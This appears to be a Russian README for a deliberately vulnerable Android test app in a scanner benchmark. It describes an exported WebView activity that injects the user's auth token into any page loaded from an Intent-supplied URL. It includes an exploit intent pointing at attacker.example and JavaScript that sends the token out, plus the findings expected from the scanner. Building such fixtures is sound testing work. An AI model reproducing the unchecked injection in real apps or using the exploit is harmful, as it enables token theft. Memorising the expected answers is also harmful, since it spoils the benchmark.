# 25 — Token injection в WebView без проверки origin

## APK после сборки

```bash
./gradlew :micro:25-webview-token-injection:assembleDebug
```

Файл: `micro/25-webview-token-injection/build/outputs/apk/debug/25-webview-token-injection-debug.apk`

## Что заложено в приложение

`WebViewActivity` объявлена `exported="true"`, в её `onCreate`:

1. URL для загрузки берётся из `intent.getStringExtra("url")` —
   без allowlist'а доменов.
2. К WebView прицеплен `WebViewClient`, у которого в `onPageFinished`
   выполняется:

   ```kotlin
   view.evaluateJavascript(
       "window.__authToken = '$authToken'; " +
       "window.dispatchEvent(new Event('app-token-ready'));",
       null
   )
   ```

   То есть Bearer/JWT токен пользователя инжектится в JS-контекст
   **любой** загруженной страницы. Ни в `onPageFinished`, ни в
   `WebViewClient.shouldOverrideUrlLoading`, ни до `loadUrl` нет
   проверки, что host совпадает с нашим доменом.

Это в точности паттерн из vault'а (WB Partners, WB iOS, Magnit, и т.д.).
Реальная атака:

```kotlin
val i = Intent().apply {
    component = ComponentName(
        "com.masttest.vuln25",
        "com.masttest.vuln25.WebViewActivity"
    )
    putExtra("url", "https://attacker.example/grab.html")
}
startActivity(i)
```

Страница `attacker.example/grab.html`:

```js
window.addEventListener('app-token-ready', () => {
    fetch("/exfil", { method: "POST",
        body: JSON.stringify({ t: window.__authToken })
    });
});
```

Токен ушёл.

Расположение: `src/main/kotlin/com/masttest/vuln25/WebViewActivity.kt`,
функция `onCreate`, и `WebViewClient.onPageFinished`.

## Что должен найти сканер

Минимально достаточный отчёт — **один-два** finding'а:

1. **Главный**: `evaluateJavascript("...$authToken...", ...)` или
   `loadUrl("javascript:...")` где аргумент содержит sensitive
   переменную (token / jwt / cookie / password). Категория R100,
   R102 (vault token-injection).
2. **Дополнительный**: URL для `loadUrl` берётся из Intent extras —
   это паттерн из app `24`. Сильный сканер дополнительно сообщит
   об этом сочетании (taint от Intent → loadUrl + token injection
   в onPageFinished без allowlist'а).

Самое важное, что должен видеть сканер — **отсутствие origin/host
check** между `intent.getStringExtra("url")` и
`evaluateJavascript("...$authToken...")`. Сама комбинация
`loadUrl + evaluateJavascript(token)` без whitelist'а домена —
это критическая ошибка.

**Чего сканер не должен делать**:

- Не должен флажить `evaluateJavascript` сам по себе — это
  легитимный API. Уязвимость только в комбинации с sensitive аргументом
  и без origin check.
- Не должен флажить `MainActivity` (лаунчер).
